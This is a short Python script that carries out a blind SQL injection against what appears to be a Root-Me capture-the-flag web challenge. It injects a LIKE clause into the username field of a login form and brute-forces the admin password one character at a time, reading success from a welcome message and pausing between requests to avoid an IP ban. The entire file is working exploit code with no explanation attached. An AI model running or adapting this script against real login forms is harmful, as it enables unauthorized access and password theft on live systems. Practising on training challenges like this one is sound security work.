import requests
import time
#config
charTab=[
	'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
	'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '{', '}', '_'	
]
url = "http://challenge01.root-me.org/web-serveur/ch10/"
expression = b"Welcome back admin !"
passLength = 8
username = 'admin'
passwordTableName = 'password'
requestPauseTime = 3.0 #to avoid ip ban
#don't touch
i=0
result=''
while(i<=passLength):
	finish=False
	i2=0
	while(i2<len(charTab) and not(finish)):
		time.sleep(requestPauseTime)
		print(i2)
		password=result+charTab[i2]
		data = {
			'username': username+'\' AND '+passwordTableName+' LIKE "'+password+'%"#"',
			'password': 'pass'
		}
		print(data)
		r = requests.post(url,data=data)
		#print(r.content)
		i2=i2+1
		if r.content.find(expression) >= 0:
			finish = True
			result=password	
	i=i+1
		

